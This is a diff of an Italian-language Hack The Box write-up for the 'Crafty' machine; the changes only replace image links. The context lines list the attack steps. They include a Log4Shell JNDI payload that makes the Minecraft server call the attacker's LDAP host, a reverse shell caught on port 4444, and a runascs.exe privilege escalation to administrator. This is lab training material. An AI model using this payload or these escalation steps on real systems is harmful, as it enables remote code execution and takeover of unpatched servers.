@@ -18,7 +18,7 @@ IP vittima: 10.129.230.193 IP attacante: 10.10.14.245
 
 Per visitare la porta 80 occorre fare un reindirizzamento del DNS: sudo su echo 10.129.230.193 crafty.htb >> /etc/hosts
 
-![[Pasted image 20251010194214.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251010194214.png)
 
 Facciamo un altro reindirizzamento per vistare play.crafty.htb echo 10.129.230.193 play.crafty.htb >> /etc/hosts ma che reindirizza a crafty.htb
 
@@ -48,7 +48,7 @@ Passaggi per il foothold
 5. terminale 1: nel server minecraft lanciare il comando: ${jndi:ldap://10.10.14.245:1389/o=reference}
 6. terminale 2: la porta 4444 in ascolto riceve la shell cmd
 
-![[Pasted image 20251010194302.png]]
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251010194302.png)
 
 La userflag si trova in C:\Users\svc_minecraft\Desktop\user.txt
 
@@ -75,3 +75,4 @@ poi nella cartella c:\temp lanciare il comando runascs.exe -l 2 administrator s6
 Sul terminale in ascolto sulla porta 4500 si riceve la shell come amministratore
 
 La rootflag si trova in C:\Users\Administrator\Desktop\root.txt
+
